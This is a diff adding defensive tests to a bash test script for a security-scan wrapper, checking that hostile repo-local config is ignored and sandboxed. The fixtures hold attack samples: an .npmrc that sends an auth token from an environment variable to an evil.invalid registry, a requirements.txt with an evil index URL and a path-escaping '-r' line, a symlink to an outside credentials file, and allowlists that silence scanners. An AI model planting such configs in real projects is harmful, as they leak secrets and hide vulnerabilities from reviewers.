@@ -21,7 +21,8 @@ no(){ printf 'FAIL  %s — %s\n' "$1" "$2"; F=$((F+1)); }
 # ── Controlled PATH: only the tools the script needs, so real scanners (or npm /
 # pip-audit / cargo) installed on the host can never leak into a test. ─────────
 SYS="$T/sysbin"; FAKE="$T/fakebin"; mkdir -p "$SYS" "$FAKE"
-for tool in bash env git jq mktemp rm cat head tail dirname basename mv grep sed tr; do
+for tool in bash env git jq mktemp rm cat head tail dirname basename mv grep sed tr \
+            awk cp find mkdir readlink ln wc ls; do
   src="$(command -v "$tool")" || { echo "security-scan-test: missing host tool $tool" >&2; exit 2; }
   ln -s "$src" "$SYS/$tool"
 done
@@ -79,6 +80,35 @@ case "${FAKE_OSV:-clean}" in
 esac
 EOF
 chmod +x "$FAKE/gitleaks" "$FAKE/semgrep" "$FAKE/osv-scanner"
+
+# Fallback auditors live in their own dir so osv-scanner is absent when used.
+FAKE2="$T/fakebin2"; mkdir -p "$FAKE2"
+cat > "$FAKE2/npm" <<'EOF'
+#!/usr/bin/env bash
+# fake npm: records its cwd, args, and what config it could see.
+{
+  printf 'npm cwd=<%s>' "$PWD"; printf ' <%s>' "$@"; echo
+  [ -e .npmrc ] && echo "npm saw-npmrc-in-cwd"
+  while [ $# -gt 0 ]; do
+    case "$1" in --userconfig|--globalconfig) [ -s "$2" ] && echo "npm nonempty-config $2"; shift 2 ;; *) shift ;; esac
+  done
+  ls -A
+} >> "$FAKE_LOG"
+case "${FAKE_NPM:-clean}" in
+  error) echo '{"message":"request to http://evil failed","error":{"summary":"","detail":""}}'; exit 1 ;;
+  findings) echo '{"vulnerabilities":{"lodash":{"name":"lodash","severity":"high","via":[{"source":1106913,"title":"Command Injection in lodash","url":"https://github.com/advisories/GHSA-35jh-r3h4-6jhm"}]}}}'; exit 1 ;;
+  *) echo '{"vulnerabilities":{},"metadata":{}}'; exit 0 ;;
+esac
+EOF
+cat > "$FAKE2/pip-audit" <<'EOF'
+#!/usr/bin/env bash
+# fake pip-audit: records the requirements content it was handed.
+req=""
+while [ $# -gt 0 ]; do case "$1" in -r) req="$2"; shift 2 ;; *) shift ;; esac; done
+{ echo "pip-audit cwd=<$PWD> req=<$req>"; sed 's/^/pip-req: /' "$req"; } >> "$FAKE_LOG"
+echo '{"dependencies":[{"name":"requests","version":"2.19.0","vulns":[]}],"fixes":[]}'
+EOF
+chmod +x "$FAKE2/npm" "$FAKE2/pip-audit"
 
 # ── Fixture project: a path with spaces + leading dash, a lockfile. ───────────
 PROJ="$T/proj"
@@ -181,6 +211,107 @@ OUT="$(cd "$G" && PATH="$FULL_PATH" bash "$SCAN" --base no-such-ref 2>/dev/null)
 OUT="$(cd "$G" && PATH="$FULL_PATH" bash "$SCAN" --base --output=/tmp/x 2>"$T/stderr")"; RC=$?
 { [ "$RC" -eq 2 ] && grep -q 'invalid --base ref' "$T/stderr"; } \
   && ok "dash-led --base ref rejected before reaching git → exit 2" || no "dash base" "rc=$RC $(cat "$T/stderr")"
+git -C "$G" add -A >/dev/null; git -C "$G" -c user.name=t -c user.email=t@t commit -qm tidy
+: > "$LOG"
+OUT="$(cd "$G" && PATH="$FULL_PATH" bash "$SCAN" --json 2>"$T/stderr")"; RC=$?
+{ [ "$RC" -eq 3 ] && [ "$(jqo '.scanners | length')" = "0" ] && [ ! -s "$LOG" ]; } \
+  && ok "no changes in scope → exit 3 (nothing checked), not 0" || no "empty scope" "rc=$RC out=$OUT"
+
+# ── --paths: missing entry is a usage error; directories expand ───────────────
+run "$FULL_PATH" --json --paths app.js does-not-exist.js
+{ [ "$RC" -eq 2 ] && grep -q 'does not exist: does-not-exist.js' "$T/stderr"; } \
+  && ok "--paths typo → exit 2 (never a silent clean)" || no "--paths missing" "rc=$RC $(cat "$T/stderr")"
+mkdir -p "$PROJ/emptydir"
+run "$FULL_PATH" --json --paths emptydir
+[ "$RC" -eq 3 ] && ok "--paths on an empty directory → exit 3" || no "empty dir" "rc=$RC out=$OUT"
+: > "$LOG"
+FAKE_GITLEAKS=findings run "$FULL_PATH" --json --paths "dir with space"
+{ [ "$RC" -eq 1 ] && grep -qF -- '<--> <./dir with space/-leading.js>' "$LOG"; } \
+  && ok "--paths <dir> expands to the files under it" || no "dir expansion" "rc=$RC $(cat "$LOG")"
+
+# ── symlinks: never followed out of the repo root ─────────────────────────────
+mkdir -p "$T/outside"; printf 'SECRET outside\n' > "$T/outside/creds.txt"
+ln -s "$T/outside/creds.txt" "$PROJ/escape.txt"
+ln -s "app.js" "$PROJ/inside-link.js"
+: > "$LOG"
+FAKE_GITLEAKS=findings run "$FULL_PATH" --json --paths escape.txt
+{ [ "$RC" -eq 3 ] && [ "$(jqo '.skipped[0] | "\(.path)|\(.reason)"')" = "escape.txt|resolves outside the repo root" ] \
+  && ! grep -q 'creds.txt\|escape.txt' "$LOG"; } \
+  && ok "symlink to a file outside the repo is skipped and reported, never scanned" \
+  || no "symlink escape" "rc=$RC out=$OUT log=$(cat "$LOG")"
+: > "$LOG"
+run "$FULL_PATH" --json --paths inside-link.js
+{ [ "$RC" -eq 0 ] && grep -qF -- '<--> <./app.js>' "$LOG"; } \
+  && ok "in-repo symlink is scanned at its real path" || no "in-repo symlink" "rc=$RC $(cat "$LOG")"
+rm -f "$PROJ/escape.txt" "$PROJ/inside-link.js"
+
+# ── untrusted repo config: gitleaks / semgrep / osv ───────────────────────────
+printf '[allowlist]\npaths = [".*"]\n' > "$PROJ/.gitleaks.toml"
+printf 'dir with space/-leading.js:generic-api-key:2\n' > "$PROJ/.gitleaksignore"
+printf '[[IgnoredVulns]]\nid = "GHSA-35jh-r3h4-6jhm"\n' > "$PROJ/osv-scanner.toml"
+: > "$LOG"
+FAKE_GITLEAKS=findings FAKE_OSV=findings run "$FULL_PATH" --json --paths "dir with space/-leading.js"
+gl_line="$(grep '^gitleaks' "$LOG" | head -n 1)"
+ign_dir="$(printf '%s' "$gl_line" | sed -E 's/.*<--gitleaks-ignore-path> <([^>]*)>.*/\1/')"
+{ printf '%s' "$gl_line" | grep -qF '<--ignore-gitleaks-allow>' \
+  && [ -n "$ign_dir" ] && [ "$ign_dir" != "$gl_line" ] \
+  && ! printf '%s' "$gl_line" | grep -qF '.gitleaks.toml'; } \
+  && ok "gitleaks: inline allow + repo .gitleaksignore disabled, repo .gitleaks.toml not passed" \
+  || no "gitleaks untrusted config" "$gl_line"
+[ "$(jqo '.scanners[] | select(.name=="gitleaks") | .notes | join(",")')" = "ignored repo-local .gitleaks.toml,ignored repo-local .gitleaksignore" ] \
+  && ok "gitleaks JSON notes report the ignored repo-local config" || no "gitleaks notes" "$OUT"
+grep '^semgrep' "$LOG" | grep -qF '<--disable-nosem>' \
+  && ok "semgrep: inline nosemgrep suppressions disabled" || no "semgrep nosem" "$(grep '^semgrep' "$LOG")"
+osv_line="$(grep '^osv-scanner' "$LOG")"
+{ printf '%s' "$osv_line" | grep -qF '<--config>' && ! printf '%s' "$osv_line" | grep -qF 'osv-scanner.toml' \
+  && [ "$(jqo '.scanners[] | select(.name=="osv-scanner") | .notes[0]')" = "ignored repo-local osv-scanner.toml" ]; } \
+  && ok "osv-scanner: forced empty --config, repo osv-scanner.toml ignored and reported" || no "osv config" "$osv_line $OUT"
+: > "$LOG"
+SECURITY_SCAN_GITLEAKS_CONFIG=/trusted/gitleaks.toml run "$FULL_PATH" --json --paths app.js
+grep '^gitleaks' "$LOG" | grep -qF '<--config> </trusted/gitleaks.toml>' \
+  && ok "SECURITY_SCAN_GITLEAKS_CONFIG supplies the gitleaks rules" || no "gitleaks override" "$(cat "$LOG")"
+rm -f "$PROJ/.gitleaks.toml" "$PROJ/.gitleaksignore" "$PROJ/osv-scanner.toml"
+
+# ── npm audit fallback: a hostile .npmrc is never honored ─────────────────────
+printf 'registry=http://evil.invalid/\n//evil.invalid/:_authToken=${ENV_SECRET}\n' > "$PROJ/.npmrc"
+echo '{"name":"proj","dependencies":{"lodash":"4.17.15"}}' > "$PROJ/package.json"
+NPM_PATH="$FAKE2:$SYS"
+: > "$LOG"
+FAKE_NPM=findings run "$NPM_PATH" --json --paths app.js
+npm_line="$(grep '^npm cwd=' "$LOG")"
+npm_cwd="$(printf '%s' "$npm_line" | sed -E 's/^npm cwd=<([^>]*)>.*/\1/')"
+{ [ "$RC" -eq 1 ] && [ -n "$npm_cwd" ] && [ "$npm_cwd" != "$PROJ" ] && [ "$npm_cwd" != "$(cd "$PROJ" && pwd -P)" ] \
+  && ! grep -q 'saw-npmrc-in-cwd\|nonempty-config' "$LOG" \
+  && printf '%s' "$npm_line" | grep -qF '<--registry> <https://registry.npmjs.org/>' \
+  && printf '%s' "$npm_line" | grep -qF '<--userconfig>' \
+  && printf '%s' "$npm_line" | grep -qF '<--globalconfig>'; } \
+  && ok "npm audit runs in an isolated temp dir: no .npmrc, empty user/global config, explicit registry" \
+  || no "npm isolation" "rc=$RC $(cat "$LOG")"
+[ "$(grep -v '^npm' "$LOG" | sort | tr '\n' ' ')" = "package-lock.json package.json " ] \
+  && ok "npm sandbox holds only package.json + lockfile" || no "npm sandbox contents" "$(cat "$LOG")"
+[ "$(jqo '.scanners[] | select(.name=="npm-audit") | "\(.status)|\(.notes[0])"')" = "findings|ignored repo-local .npmrc" ] \
+  && ok "npm finding reported; ignored .npmrc noted" || no "npm notes" "$OUT"
+: > "$LOG"
+SECURITY_SCAN_NPM_REGISTRY=https://mirror.example/ run "$NPM_PATH" --json --paths app.js
+grep -qF '<--registry> <https://mirror.example/>' "$LOG" \
+  && ok "SECURITY_SCAN_NPM_REGISTRY overrides the registry" || no "npm registry override" "$(cat "$LOG")"
+FAKE_NPM=error run "$NPM_PATH" --json --paths app.js
+{ [ "$RC" -eq 4 ] && jqo '.scanners[] | select(.name=="npm-audit") | .reason' | grep -q 'request to http://evil failed'; } \
+  && ok "npm error keeps its reason (empty summary does not swallow message)" || no "npm reason" "rc=$RC $OUT"
+rm -f "$PROJ/.npmrc" "$PROJ/package.json" "$PROJ/package-lock.json"
+
+# ── pip-audit fallback: option lines never reach pip-audit ────────────────────
+printf -- '--index-url http://evil.invalid/simple\n  -r ../../outside.txt\nrequests==2.19.0\n' > "$PROJ/requirements.txt"
+: > "$LOG"
+run "$NPM_PATH" --json --paths app.js
+{ [ "$RC" -eq 0 ] && grep -q '^pip-req: requests==2.19.0$' "$LOG" && ! grep -q 'index-url\|outside.txt' "$LOG" \
+  && ! grep -qF "req=<./requirements.txt> " "$LOG" && grep -q "pip-audit cwd=<" "$LOG" \
+  && [ "$(grep '^pip-audit cwd=' "$LOG" | sed -E 's/^pip-audit cwd=<([^>]*)>.*/\1/')" != "$PROJ" ] \
+  && jqo '.scanners[] | select(.name=="pip-audit") | .notes[0]' | grep -q 'stripped 2 option line'; } \
+  && ok "pip-audit gets a sanitized copy (no --index-url / -r lines) and a note" \
+  || no "pip sanitize" "rc=$RC $(cat "$LOG") $OUT"
+rm -f "$PROJ/requirements.txt"
+echo '{"lockfileVersion":3,"packages":{}}' > "$PROJ/package-lock.json"
 
 echo ""
 echo "security-scan-test: $P passed, $F failed."
